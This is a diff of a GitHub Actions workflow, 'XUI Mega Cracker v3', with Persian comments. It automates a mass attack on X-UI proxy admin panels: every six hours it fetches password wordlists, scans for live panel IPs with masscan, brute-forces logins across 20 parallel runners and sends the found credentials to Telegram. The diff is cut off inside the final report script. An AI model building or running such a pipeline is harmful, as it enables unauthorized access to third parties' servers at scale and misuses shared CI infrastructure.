@@ -1,9 +1,28 @@
-name: XUI Mega Cracker
+name: XUI Mega Cracker v3
 
 on:
-  workflow_dispatch:  # اجرای دستی
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'حالت اجرا'
+        type: choice
+        options:
+          - full
+          - fetch-ips-only
+          - fetch-wordlists-only
+        default: full
+      max_ips:
+        description: 'حداکثر تعداد آیپی (پیشفرض: 500)'
+        type: string
+        default: '500'
+        required: false
+      threads:
+        description: 'تعداد ترد در هر هدف (پیشفرض: 30)'
+        type: string
+        default: '30'
+        required: false
   schedule:
-    - cron: '0 */6 * * *'  # هر ۶ ساعت خودکار
+    - cron: '0 */6 * * *'
 
 env:
   BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
@@ -22,19 +41,22 @@ jobs:
           python-version: '3.11'
       
       - name: Install dependencies
-        run: pip install requests
+        run: |
+          pip install -r requirements.txt
+          sudo apt-get update
+          sudo apt-get install -y masscan
       
-      - name: Download & merge 10 massive wordlists
-        run: python xui_mega_cracker.py --fetch-wordlists
+      - name: Download & merge wordlists
+        run: python xui_mega_v3.py --fetch-wordlists
       
-      - name: Upload wordlists as artifact
+      - name: Upload wordlists
         uses: actions/upload-artifact@v4
         with:
           name: wordlists
           path: wordlists/
           retention-days: 1
 
-  # ===== مرحله ۲: پیدا کردن آیپی‌های زنده =====
+  # ===== مرحله ۲: پیدا کردن آیپی‌ها (همزمان) =====
   fetch-ips:
     runs-on: ubuntu-latest
     needs: fetch-wordlists
@@ -46,35 +68,38 @@ jobs:
         with:
           python-version: '3.11'
       
-      - name: Install dependencies
+      - name: Install dependencies & tools
         run: |
-          pip install requests googlesearch-python beautifulsoup4
+          pip install -r requirements.txt
+          sudo apt-get update
+          sudo apt-get install -y masscan
       
-      - name: Download wordlists from previous job
+      - name: Download wordlists
         uses: actions/download-artifact@v4
         with:
           name: wordlists
           path: wordlists/
       
-      - name: Fetch live X-UI IPs (no API keys)
-        run: python xui_mega_cracker.py --fetch-ips
+      - name: Fetch live IPs (masscan + public lists)
+        run: python xui_mega_v3.py --fetch-ips
       
-      - name: Upload IPs as artifact
+      - name: Upload IPs
         uses: actions/upload-artifact@v4
         with:
           name: ips
           path: ips.txt
           retention-days: 1
 
-  # ===== مرحله ۳: کرک کردن با ماتریس ۲۰ تایی =====
+  # ===== مرحله ۳: کرک ماتریسی ۲۰ تایی =====
   crack:
     runs-on: ubuntu-latest
     needs: [fetch-wordlists, fetch-ips]
+    if: github.event.inputs.mode != 'fetch-ips-only' && github.event.inputs.mode != 'fetch-wordlists-only'
     strategy:
       matrix:
         chunk: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-      max-parallel: 20  # حداکثر ۲۰ رانر همزمان
-      fail-fast: false   # اگه یکی fail بشه بقیه ادامه بدن
+      max-parallel: 20
+      fail-fast: false
     steps:
       - uses: actions/checkout@v4
       
@@ -84,7 +109,7 @@ jobs:
           python-version: '3.11'
       
       - name: Install dependencies
-        run: pip install requests
+        run: pip install -r requirements.txt
       
       - name: Download artifacts
         uses: actions/download-artifact@v4
@@ -103,7 +128,7 @@ jobs:
           CHUNK_ID: ${{ matrix.chunk }}
           TOTAL_CHUNKS: 20
         run: |
-          python xui_mega_cracker.py --chunk $CHUNK_ID --total-chunks $TOTAL_CHUNKS
+          python xui_mega_v3.py --chunk $CHUNK_ID --total-chunks $TOTAL_CHUNKS
       
       - name: Upload results
         if: always()
@@ -113,11 +138,11 @@ jobs:
           path: good.txt
           retention-days: 7
 
-  # ===== مرحله ۴: جمع‌آوری نهایی و ارسال گزارش =====
+  # ===== مرحله ۴: گزارش نهایی =====
   final-report:
     runs-on: ubuntu-latest
     needs: crack
-    if: always()
+    if: always() && github.event.inputs.mode != 'fetch-ips-only' && github.event.inputs.mode != 'fetch-wordlists-only'
     steps:
       - uses: actions/checkout@v4
       
@@ -128,9 +153,9 @@ jobs:
           path: results/
           merge-multiple: true
       
-      - name: Merge and send final report
+      - name: Send final report to Telegram
         run: |
-          cat results/*.txt > all_results.txt 2>/dev/null || echo "No results found" > all_results.txt
+          cat results/*.txt > all_results.txt 2>/dev/null || echo "⚠️ No credentials found" > all_results.txt
           python -c "
           import requests
           import os
